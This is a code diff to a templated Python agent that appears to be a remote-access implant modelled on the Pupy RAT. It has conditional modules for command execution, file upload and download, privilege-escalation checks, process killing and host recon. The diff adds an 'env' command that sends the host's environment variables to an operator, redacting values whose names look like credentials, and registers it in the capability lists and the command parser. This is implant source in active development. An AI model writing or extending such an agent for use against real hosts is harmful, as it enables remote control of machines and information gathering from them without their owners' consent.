@@ -638,6 +638,7 @@ def _action_bind() -> None:
     table["process_kill"] = lambda task: mod_process_kill(task)
     table["pwd"] = lambda task: mod_pwd()
     table["get_hwuuid"] = lambda task: mod_hwuuid()
+    table["env"] = lambda task: mod_env()
 {% else %}
     table["ping"] = lambda task: {"pong": True, "id": AGENT_ID}
 {% endif %}
@@ -712,7 +713,7 @@ _OBF = _NoopObf()
 # Unconditional: the plaintext TCP ListenerClient path needs it regardless of
 # the obfuscation level.
 CAPABILITIES = [
-    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid",{% endif %}
+    {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env",{% endif %}
     {% if include_exec %}"exec",{% endif %}
     {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
     {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -1552,6 +1553,31 @@ def mod_hwuuid():
     return {"error": "no hardware identifier available on this host"}
 
 
+def mod_env():
+    """The agent's environment, with credential-looking values withheld.
+
+    Upstream Pupy's ``env``, reimplemented natively under the revised strategy
+    (no third-party tree). A raw dump is a credential leak -- an agent's
+    environment can hold proxy passwords, cloud keys and session tokens -- so
+    values whose NAME looks sensitive are redacted by key and the keys are
+    named back, never silently dropped. An operator needs to know something was
+    withheld and what it was called.
+    """
+    markers = ("secret", "token", "password", "passwd", "key", "credential",
+               "auth", "session", "private", "passphrase")
+    variables = {}
+    redacted = []
+    try:
+        for name, value in _o.environ.items():
+            if any(marker in name.lower() for marker in markers):
+                redacted.append(name)
+                continue
+            variables[name] = value
+    except Exception as exc:
+        return {"error": f"cannot read the environment: {exc}"}
+    return {"variables": variables, "redacted": sorted(redacted)}
+
+
 def mod_netstat():
     """Established connections, as the host itself sees them.
 
@@ -2250,7 +2276,7 @@ def _register(transport) -> tuple:
         "capabilities": [
             {% if include_exec %}"exec",{% endif %}
             "ping", "shutdown",
-            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid",{% endif %}
+            {% if include_recon %}"sysinfo", "network", "processes", "netstat", "process_kill", "pwd", "get_hwuuid", "env",{% endif %}
 
             {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
             {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
@@ -2375,7 +2401,7 @@ def _parse_command(text: str) -> dict:
         return {"action": "exec", "command": text}
     verb, _, rest = text.partition(" ")
     v, arg = verb.lower(), text[len(verb):].strip()
-    if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid",
+    if v in ("sysinfo", "network", "netstat", "pwd", "get_hwuuid", "env",
              "privesc_check", "privesc_suggest", "ping"):
         return {"action": v}
     if v in ("ps", "processes"):
